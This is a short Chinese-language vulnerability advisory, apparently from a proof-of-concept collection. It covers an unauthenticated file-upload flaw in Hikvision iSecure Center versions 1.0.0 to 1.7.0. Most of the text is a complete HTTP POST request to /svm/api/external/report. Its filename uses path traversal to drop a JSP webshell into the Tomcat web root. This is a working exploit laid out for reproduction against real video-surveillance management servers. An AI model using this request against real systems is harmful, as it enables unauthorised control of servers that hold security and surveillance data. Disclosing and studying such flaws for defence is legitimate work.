#### 影响范围

iSecure Center V1.0.0 - V1.7.0

#### 漏洞概述

海康威视股份有限公司是⼀家专业从事视频监控产品的研发、⽣产和销售的 ⾼科技企业。 海康威视iSecure Center综合安防管理平台软件存在⽂件上传漏洞，未经授权的攻击者可以上传恶意Webshell ⽂件从⽽控制服务器

#### 漏洞复现

漏洞POC：

```
POST /svm/api/external/report HTTP/1.1
Host: x.x.x.x
Content-Length: 238
Cache-Control: max-age=0
Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36
Origin: null
Content-Type: multipart/form-data;boundary=----WebKitFormBoundary9PggsiM755PLa54a
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site 
Sec-Fetch-Mode: navigate 
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document 
Accept-Encoding: gzip, deflate 
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 
Connection: close

------WebKitFormBoundary9PggsiM755PLa54a
Content-Disposition: form-data; name="file"; filename="../../../tomcat85linux64.1/webapps/els/static/webshellname.jsp" 
Content-Type: application/zip

shell
------WebKitFormBoundary9PggsiM755PLa54a--
```



